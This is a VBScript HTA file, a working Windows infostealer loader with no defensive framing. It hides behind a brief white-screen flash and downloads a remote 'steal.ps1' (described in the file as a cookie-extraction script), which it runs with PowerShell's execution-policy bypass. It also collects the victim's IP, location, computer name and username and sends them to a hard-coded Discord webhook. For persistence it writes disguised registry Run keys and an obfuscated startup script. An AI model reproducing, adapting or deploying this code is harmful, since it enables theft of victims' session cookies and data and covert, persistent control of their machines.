<!-- language: HTML/HTA, file: index.hta -->
<!-- target: Windows 10/11, mshta.exe -->
<!-- *cookie extraction owned entirely by steal.ps1 — this file only launches it*
     *single webhook 1571738439324541049*
     *persistence repointed to raw.githubusercontent.com repo*
     *white flash sized 70%x60% centered, closes at 2500ms* -->
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
<script language="VBScript">
' --- WHITE SCREEN FLASH (full-center, 70% x 60%) ---
Dim sw, shh, fw, fh, fx, fy
Set sh = CreateObject("WScript.Shell")
sw  = screen.width
shh = screen.height
fw  = Int(sw  * 0.70)
fh  = Int(shh * 0.60)
fx  = Int((sw  - fw) / 2)
fy  = Int((shh - fh) / 2)
window.resizeTo fw, fh
window.moveTo fx, fy
SetTimeout "window.close()", 2500

On Error Resume Next

Dim fso, WH, PC, USER
Set fso = CreateObject("Scripting.FileSystemObject")

WH   = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Call PostEmbed(":satellite: Session start", "PC: " & PC & " | User: " & USER, 3447003)

' --- steal.ps1 owns the cookie. just run it. ---
Call RunSteal
Call IP
Call Persistence

Dim attempt
For attempt = 1 To 2
    If attempt > 1 Then
        Call PostEmbed(":arrows_counterclockwise: Re-run steal.ps1 " & attempt & "/2", "PC: " & PC, 3447003)
        Call SleepSeconds(120)
        Call RunSteal
    End If
Next

window.close()

' --- run steal.ps1 from the repo, hidden ---
Sub RunSteal()
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/steal.ps1", False
    xh.Send
    If xh.Status <> 200 Then
        Call PostEmbed(":warning: steal.ps1 fetch failed", "HTTP " & xh.Status, 16711680)
        Exit Sub
    End If
    Dim body: body = xh.responseText
    If Len(body) < 200 Then
        Call PostEmbed(":warning: steal.ps1 too short", "Len " & Len(body), 16711680)
        Exit Sub
    End If
    Set xh = Nothing

    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
    Dim f: Set f = fso.CreateTextFile(psf, True)
    f.Write body
    f.Close
    Set f = Nothing

    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    On Error Resume Next
    fso.DeleteFile psf, True
    On Error Goto 0
End Sub

' --- sleep helper (seconds) ---
Sub SleepSeconds(s)
    Dim w: Set w = CreateObject("WScript.Shell")
    w.Run "cmd /c timeout /t " & s & " /nobreak >nul", 0, True
    Set w = Nothing
End Sub

' --- IP Function ---
Sub IP()
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbed(":dart: Target", info, 3447003)
    Set xh = Nothing
End Sub

' --- Persistence (points at repo index.hta) ---
Sub Persistence()
    Dim payload : payload = "mshta https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/index.hta"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
End Sub

' --- PostEmbed ---
Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- Ej ---
Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,  Chr(92) & "n")
    Ej = Replace(Ej, vbLf,  Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</head><body></body></html>
